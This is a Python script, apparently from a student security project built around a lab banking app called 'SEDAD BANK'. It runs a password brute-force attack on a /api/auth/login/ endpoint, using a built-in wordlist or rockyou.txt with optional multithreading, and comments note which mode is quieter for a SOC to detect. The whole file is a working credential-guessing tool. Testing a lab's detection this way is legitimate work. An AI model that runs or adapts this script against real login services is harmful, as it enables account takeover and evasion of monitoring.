#!/usr/bin/env python3
"""
Brute Force Attack — SEDAD BANK PFE
Teste l'endpoint /api/auth/login/ avec une wordlist.

Usage:
  python brute_force.py --url http://URL_CIBLE --email user@test.com
  python brute_force.py --url http://URL_CIBLE --email user@test.com --wordlist /usr/share/wordlists/rockyou.txt
  python brute_force.py --url http://URL_CIBLE --email user@test.com --threads 10

Installation rockyou.txt (Arch Linux):
  sudo pacman -S wordlists    # ou
  wget -O /tmp/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
"""
import requests
import time
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Wordlist intégrée (fallback si pas de fichier)
BUILTIN_WORDLIST = [
    "password", "123456", "password123", "admin", "admin123",
    "test123", "qwerty", "letmein", "123456789", "welcome",
    "monkey", "dragon", "master", "sedad123", "bank123",
    "fintech", "mauritanie", "nouakchott", "Pass@123", "Sedad@2024",
    "trustno1", "hello123", "pass123", "test1234", "abcdef",
    "111111", "sunshine", "iloveyou", "princess", "football",
    "shadow", "superman", "michael", "jennifer", "thomas",
    "12345678", "1234567", "baseball", "dragon", "master",
    "login", "abc123", "starwars", "solo", "matrix",
]

found_password = None

def try_password(url: str, email: str, password: str, session: requests.Session):
    global found_password
    if found_password:
        return None
    try:
        r = session.post(url,
                         json={"email": email, "password": password},
                         timeout=8)
        if r.status_code == 200:
            found_password = password
            return password
        return None
    except Exception:
        return None

def load_wordlist(path: str | None) -> list:
    if path:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            print(f"[+] Wordlist chargée : {len(words):,} mots depuis {path}")
            return words
        except FileNotFoundError:
            print(f"[!] Fichier non trouvé : {path}")
            print("[*] Utilisation de la wordlist intégrée")
    else:
        print(f"[*] Wordlist intégrée ({len(BUILTIN_WORDLIST)} mots)")
    return BUILTIN_WORDLIST

def run(base_url: str, email: str, wordlist_path: str | None,
        delay: float, threads: int, limit: int):
    global found_password

    url = f"{base_url.rstrip('/')}/api/auth/login/"
    wordlist = load_wordlist(wordlist_path)

    if limit > 0:
        wordlist = wordlist[:limit]

    print("=" * 65)
    print("  BRUTE FORCE — SEDAD BANK PFE")
    print("=" * 65)
    print(f"  Cible    : {url}")
    print(f"  Email    : {email}")
    print(f"  Mots     : {len(wordlist):,}")
    print(f"  Threads  : {threads}")
    print(f"  Début    : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 65)

    start = time.time()
    tested = 0

    with requests.Session() as session:
        if threads == 1:
            # Mode séquentiel (plus silencieux pour le SOC)
            for i, pwd in enumerate(wordlist, 1):
                if found_password:
                    break
                result = try_password(url, email, pwd, session)
                tested += 1
                status = "TROUVE!" if result else f"echec"
                print(f"\r[{i:>6}/{len(wordlist)}] Tentative: {pwd:<25} {status}", end="", flush=True)
                if result:
                    break
                time.sleep(delay)
        else:
            # Mode multi-thread (détectable par le SOC)
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(try_password, url, email, pwd, session): pwd
                    for pwd in wordlist
                }
                for future in as_completed(futures):
                    tested += 1
                    pwd = futures[future]
                    result = future.result()
                    print(f"\r[{tested:>6}/{len(wordlist)}] Tentative: {pwd:<25}", end="", flush=True)
                    if result:
                        break

    elapsed = time.time() - start
    print()
    print("=" * 65)
    if found_password:
        print(f"  [OK] MOT DE PASSE TROUVE : {found_password}")
    else:
        print(f"  [FIN] Aucun mot de passe trouvé")
    print(f"  Mots testés  : {tested:,}")
    print(f"  Durée        : {elapsed:.1f}s ({tested/elapsed:.0f} req/s)")
    print(f"  Dashboard SOC: {base_url.replace('8000','3000')}/d/sedad-bank-soc")
    print("=" * 65)
    return found_password

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Brute Force SEDAD BANK — PFE Sécurité")
    p.add_argument("--url",      default="http://localhost:8000", help="URL de base du backend")
    p.add_argument("--email",    required=True,                   help="Email cible")
    p.add_argument("--wordlist", default=None,                    help="Chemin vers rockyou.txt")
    p.add_argument("--delay",    type=float, default=0.1,         help="Délai entre requêtes (s)")
    p.add_argument("--threads",  type=int,   default=1,           help="Threads parallèles")
    p.add_argument("--limit",    type=int,   default=0,           help="Limiter à N mots (0=tout)")
    args = p.parse_args()
    run(args.url, args.email, args.wordlist, args.delay, args.threads, args.limit)
